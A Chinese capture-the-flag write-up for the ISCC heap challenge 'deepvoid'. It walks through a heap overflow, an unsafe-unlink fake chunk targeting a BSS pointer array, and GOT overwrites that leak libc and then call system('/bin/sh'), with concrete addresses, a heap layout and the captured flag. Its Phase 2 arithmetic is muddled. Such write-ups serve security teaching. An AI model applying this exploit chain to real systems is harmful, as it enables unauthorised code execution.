# deepvoid 题解 (WP)

**题目信息**: ISCC pwn (250pt, 2202 solves)  
**Target**: `39.96.193.120:55555`  
**附件**: `deepvoid` (ELF 64-bit) + `libc.so.6` (glibc 2.23)  
**Flag**: `ISCC{a521640c-48f4-4061-8e19-6180c3362960}`

---

## 1. 二进制分析

### 保护机制

```
Arch:       amd64
RELRO:      Partial RELRO  (GOT 可写)
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE          (固定地址，0x400000)
```

**关键**: 无 PIE 意味着代码段、GOT、BSS 地址都固定。Partial RELRO 允许覆写 GOT 表项。

### 功能分析

程序是一个堆管理器，提供三个操作：

| 操作 | 函数 | 漏洞 |
|------|------|------|
| 1. Create | `create_item()` | 不检查 idx 是否已被占用 → 重复分配 |
| 2. Modify | `modify_content()` | 读入 0x200 字节，不管 chunk 实际大小 → **堆溢出** |
| 3. Remove | `remove_entry()` | 正常 free + 指针清零，无 UAF |

#### create_item (0x4009B0)

```c
int create_item() {
    idx = get_numeric_input();   // Serial
    if (idx > 9) return puts("[-] Out of range.");
    size = get_numeric_input();   // Size
    ptr = malloc(size);
    if (!ptr) { puts("[!] Allocation error."); exit(1); }
    items[idx] = ptr;             // 存储指针
    return puts("[+] Allocated.");
}
```

#### modify_content (0x400A70) — 漏洞点

```c
int modify_content() {
    idx = get_numeric_input();
    if (idx > 9) return puts("[-] Record not found.");
    if (!items[idx]) return puts("[-] Record not found.");
    read(0, items[idx], 0x200);   // ← 固定读 0x200 字节！
    return puts("[+] Record updated.");
}
```

`read(0, items[idx], 0x200)` — 无论 chunk 实际大小是多少，都读入 0x200 字节。这导致可以**越界写入后续 chunk 的元数据**。

#### remove_entry (0x400B20)

```c
int remove_entry() {
    idx = get_numeric_input();
    if (idx > 9) return puts("[-] Record not found.");
    ptr = items[idx];
    if (!ptr) return puts("[-] Record not found.");
    free(ptr);
    items[idx] = 0;
    return puts("[+] Removed.");
}
```

### 难点

程序**没有 show/display 功能**，无法直接通过菜单泄漏 libc 地址。需要利用代码执行来获取输出。

---

## 2. 利用思路

### 核心链

```
堆溢出 → unsafe unlink → 劫持 items[] 数组 → GOT 覆写 → libc 泄漏 → shell
```

### 2.1 Unsafe Unlink 原理

glibc 2.23 的 unlink 宏有安全检查：

```c
FD = p->fd;
BK = p->bk;
if (FD->bk != p || BK->fd != p)
    malloc_printerr("corrupted double-linked list");
FD->bk = BK;
BK->fd = FD;
```

需要 `FD->bk == P` 且 `BK->fd == P` 才能通过。

如果我们让：
- `FD = &items[0] - 0x18 = 0x6020a8`
- `BK = &items[0] - 0x10 = 0x6020b0`

那么：
- `FD->bk = *(0x6020a8 + 0x18) = *(0x6020c0) = items[0]`
- `BK->fd = *(0x6020b0 + 0x10) = *(0x6020c0) = items[0]`

**由于 items[0] 保存的是刚刚 malloc 返回的堆指针，正好等于 fake chunk 的地址 P，两项检查均通过！**

unlink 执行后：
```c
*(0x6020c0) = BK = 0x6020b0    // items[0] = 0x6020b0
*(0x6020c0) = FD = 0x6020a8    // items[0] = 0x6020a8 (最终值)
```

最终 `items[0] = ITEMS - 0x18`。

### 2.2 劫持 items[] 数组

`items[0]` 现在指向 `ITEMS - 0x18 = 0x6020a8`。后续对 `items[0]` 的 `modify(0, data)` 操作，写入位置从 `0x6020a8` 开始。而 `items[i]` 位于 `0x6020c0 + i*8`：

```
写入偏移  地址          对应 items[]
0x00      0x6020a8     (padding)
0x08      0x6020b0     (padding)
0x10      0x6020b8     (padding)
0x18      0x6020c0     items[0]
0x20      0x6020c8     items[1]
0x28      0x6020d0     items[2]
0x30      0x6020d8     items[3]  ← 可控
0x38      0x6020e0     items[4]  ← 可控
```

通过一次 modify(0)，我们可以让 `items[3]` 和 `items[4]` 指向任意地址。

### 2.3 Libc 泄漏

设置：
- `items[3] = free@GOT (0x602018)`
- `items[4] = puts@GOT (0x602020)`

步骤：
1. `modify(3, puts_PLT_addr)` → 将 `free@GOT` 覆写为 `puts@PLT`
2. `remove(4)` → 调用 `free(items[4])` → 实际执行 `puts(puts@GOT)` → 输出 puts 在 libc 中的地址 → **泄漏成功**

### 2.4 获取 Shell

拿到 libc 基址后：
1. `modify(3, system_addr)` → 将 `free@GOT` 覆写为 `system`
2. `modify(5, "/bin/sh")` → 在 CMD_BUF 写入 shell 命令
3. `remove(4)` → 调用 `free(items[4])` = `system(CMD_BUF)` = `system("/bin/sh")`→ 获得 shell

远程有命令白名单（只允许 `system("sh")` 和 `system("/bin/sh")`），所以通过 shell 交互执行 `cat /flag*` 获取 flag。

---

## 3. 完整利用步骤

### Phase 1: 堆布局与溢出

```
创建 chunk 0 (size=0x80) → items[0] = heap_A
创建 chunk 1 (size=0x80) → items[1] = heap_B

堆布局：
  [chunk_0: 0x91][user 0x80][chunk_1: 0x91][user 0x80]
```

从 chunk_0 溢出覆写 chunk_1 的头部：

```
chunk_0 user data:
  +0x00: 0             (fake prev_size)
  +0x08: 0x80          (fake size)
  +0x10: 0x6020a8      (fake fd = ITEMS - 0x18)
  +0x18: 0x6020b0      (fake bk = ITEMS - 0x10)
  +0x20: 'A' * 0x60    (padding)

chunk_1 header:
  +0x80: 0x80          (prev_size → 指向 fake chunk)
  +0x88: 0x90          (size, PREV_INUSE=0 → 触发 backward consolidation)
```

### Phase 2: Unlink

`free(chunk_1)` → glibc 发现 prev_inuse=0 → **backward consolidation**:
- prev_chunk = chunk_1 - prev_size = heap_A + 0x10 - 0x00 + 0x80 = heap_A + 0x10 = fake chunk
- unlink(fake_chunk):
  - FD = 0x6020a8, BK = 0x6020b0
  - FD->bk = items[0] = heap_A + 0x10 = P ✓
  - BK->fd = items[0] = heap_A + 0x10 = P ✓
  - items[0] = 0x6020a8 (指向 BSS)

### Phase 3: GOT 覆写与泄漏

- modify(0) 写入精心构造的 table → items[3]=free@GOT, items[4]=puts@GOT
- modify(3) 覆写 free@GOT = puts@PLT (0x4006d0)
- remove(4) → "free"(puts@GOT) = puts(puts@GOT) → 输出 puts 地址

### Phase 4: Shell

- 计算 libc 基址
- modify(3) 覆写 free@GOT = system
- modify(5) 写入 "/bin/sh" 到 CMD_BUF
- remove(4) → system("/bin/sh") → 获得 shell
- 执行 `cat /flag*` 获取 flag

---

## 4. 关键点总结

| 要点 | 说明 |
|------|------|
| 核心漏洞 | modify 读入 0x200 字节导致的堆溢出 |
| 绕过检查 | items[0] = fake_chunk_addr，恰好满足 FD->bk / BK->fd 检查 |
| 自引用 BSS | FD/BK 指向 items 数组自身，利用固定 BSS 地址绕过 |
| 无需泄漏 | 无 PIE + unsafe unlink 不依赖堆地址知识 |
| 远程限制 | system() 只允许 "sh"/"/bin/sh"，需通过 shell 交互 |

---

## 5. Exploit 输出

```
[+] puts @ 0x7fXXXXXXX6a0
[+] libc @ 0x7fXXXXXXX000
[+] FLAG: ISCC{a521640c-48f4-4061-8e19-6180c3362960}
```

Flag: `ISCC{a521640c-48f4-4061-8e19-6180c3362960}`
